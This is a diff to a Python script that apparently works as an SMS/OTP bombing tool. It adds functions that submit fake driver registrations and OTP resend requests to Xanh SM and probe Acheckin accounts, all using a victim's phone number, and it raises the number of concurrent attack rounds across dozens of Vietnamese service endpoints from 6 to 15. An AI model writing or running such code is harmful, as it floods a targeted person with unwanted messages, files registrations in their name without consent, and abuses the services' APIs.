@@ -32,8 +32,6 @@ def sdtt(sdt):
 
 sdt_chuyen_doi = sdtt(sdt)
 
-count = 6
-
 def tv360():
     cookies = {
         'img-ext': 'avif',
@@ -3834,6 +3832,110 @@ def viettelpost():
     except requests.exceptions.RequestException:
         print("VIETTELPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def xanhsmreg():
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://dangky.xanhsm.com',
+        'priority': 'u=1, i',
+        'referer': 'https://dangky.xanhsm.com/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'Data': {
+            'YearExperience': 'GT_5_YEAR',
+            'AppPartners': [
+                'Gojek',
+            ],
+            'OnlineTime': 'FROM_4H_TO_8H_DAY',
+            'DesiredIncome': 'FROM_10M_TO_20M',
+            'BirthPlace': 'An Giang',
+        },
+        'City': 'hanoi',
+        'Tel': sdt,
+        'Name': 'VAN A DAT',
+        'Source': '',
+        'Online': False,
+    }
+
+    try:
+        response = requests.post('https://gapi.xanhsm.com/bike/registering/create-registration', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("XANHSMREG | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("XANHSMREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def xanhsm():
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://dangky.xanhsm.com',
+        'priority': 'u=1, i',
+        'referer': 'https://dangky.xanhsm.com/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'Tel': sdt,
+    }
+
+    try:
+        response = requests.post('https://gapi.xanhsm.com/bike/registering/resend-otp', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("XANHSM | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("XANHSM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def acheckin():
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'access-control-allow-origin': '*',
+        'authorization': 'undefined',
+        'content-type': 'application/json',
+        'locale': 'vi-VN',
+        'origin': 'https://hrm.acheckin.io',
+        'priority': 'u=1, i',
+        'referer': 'https://hrm.acheckin.io/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-workspace-host': 'hrm.acheckin.io',
+    }
+
+    params = {
+        'search': sdt_chuyen_doi,
+    }
+
+    try:
+        response = requests.get(
+            'https://api-gateway.acheckin.io/v1/external/auth/check-existed-account',
+            params=params,
+            headers=headers,
+        )
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("ACHECKIN | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("ACHECKIN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def call_functions():
     functions = [
@@ -3844,13 +3946,13 @@ def call_functions():
         winny, owen, befood, foodhubzl, heyu, pantioresend, vttelecom, vinwonders, vietair, vexere,
         atadi, etrip4u, tinyworld, chudu24, sojo, hasaki, kiehls, emart, hanoia, ahamove, fahasa,
         vascara, sablanca, sandro, routine, coolmate, mioto, coolmatereset, pharmartsms, medigosms, avakids,
-        giathuoctot, medigozl, ddmevabereg, pnjsms, pharmartzl, jiohealth, ddmevabe,
+        giathuoctot, medigozl, ddmevabereg, pnjsms, pharmartzl, jiohealth, ddmevabe, xanhsmreg,
         nhathuocankhang, mutosi, mocha, sigo, vietravel, pnjzl, mamanbebe, tatmart, dominos,
-        pico, hacom, liena, gofood, pasgo, coolmateresend, vietloan, viettelpost
+        pico, hacom, liena, gofood, pasgo, coolmateresend, vietloan, viettelpost, xanhsm, acheckin
     ]
     
     with concurrent.futures.ThreadPoolExecutor() as executor:
-        for _ in range(count):
+        for _ in range(15):
             futures = []
             # Thực hiện các hàm theo nhóm với thời gian delay giữa các nhóm
             for i, func in enumerate(functions):
